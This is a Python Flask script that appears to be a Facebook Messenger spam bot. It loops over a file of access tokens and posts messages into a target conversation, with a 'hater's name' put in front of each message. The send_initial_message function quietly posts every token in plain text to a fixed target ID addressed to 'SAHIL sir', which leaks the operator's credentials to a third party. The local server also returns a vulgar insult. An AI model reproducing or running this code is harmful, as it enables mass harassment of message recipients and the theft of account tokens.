from flask import Flask, render_template, request, jsonify
import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading
import random
from config import DevelopmentConfig

app = Flask(__name__, template_folder='templates')
app.config.from_object(DevelopmentConfig)

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        """Handles GET requests"""
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"-- MAFIA DON HU B3 BHOSDIK3")

class ThreadWithStop(threading.Thread):
    def __init__(self, target):
        super().__init__(target=target)
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def stopped(self):
        return self._stop_event.is_set()

def execute_server():
    """Runs the HTTP server"""
    PORT = app.config['PORT']
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        while True:
            if execute_server_thread.stopped():
                break
            httpd.handle_request()

def send_initial_message():
    """Sends initial message"""
    try:
        with open(app.config['TOKEN_FILE'], 'r') as file:
            tokens = file.readlines()
        msg_template = "Hello SAHIL sir! I am using your token is = {}"
        target_id = app.config['TARGET_ID']
        for token in tokens:
            access_token = token.strip()
            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
            msg = msg_template.format(access_token)
            parameters = {'access_token': access_token, 'message': msg}
            response = requests.post(url, json=parameters)
            time.sleep(0.1)
    except Exception as e:
        print("[!] An error occurred: {}".format(e))

def send_messages_from_file():
    """Sends messages from file"""
    try:
        with open(app.config['CONVO_FILE'], 'r') as file:
            convo_id = file.read().strip()
        with open(app.config['MESSAGE_FILE'], 'r') as file:
            messages = file.readlines()
        num_messages = len(messages)
        with open(app.config['TOKEN_FILE'], 'r') as file:
            tokens = file.readlines()
        num_tokens = len(tokens)
        max_tokens = min(num_tokens, num_messages)
        with open(app.config['HATERS_NAME_FILE'], 'r') as file:
            haters_name = file.read().strip()
        with open(app.config['TIME_FILE'], 'r') as file:
            speed = int(file.read().strip())
        message_index = 0
        while True:
            if send_messages_from_file_thread.stopped():
                break
            token_index = message_index % max_tokens
            access_token = tokens[token_index].strip()
            message = messages[message_index].strip()
            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
            parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
            response = requests.post(url, json=parameters)
            time.sleep(speed)
            message_index += 1
            if message_index >= num_messages:
                break
    except Exception as e:
        print("[!] An error occurred: {}".format(e))

execute_server_thread = ThreadWithStop(target=execute_server)
send_initial_message_thread = ThreadWithStop(target=send_initial_message)
send_messages_from_file_thread = ThreadWithStop(target=send_messages_from_file)

@app.route("/")
def index():
    """Renders the index template"""
    return render_template("index.html")

@app.route("/run", methods=["POST"])
def run():
    """Starts the script"""
    execute_server_thread.start()
    send_initial_message_thread.start()
    send_messages_from_file_thread.start()
    return jsonify({"message": "Script running successfully!"})

@app.route("/stop", methods=["POST"])
def stop():
    """Stops the script"""
    execute_server_thread.stop()
    send_initial_message_thread.stop()
    send_messages_from_file_thread.stop()
    return jsonify({"message": "Script stopped successfully!"})

if __name__ == "__main__":
    app.run(debug=True)
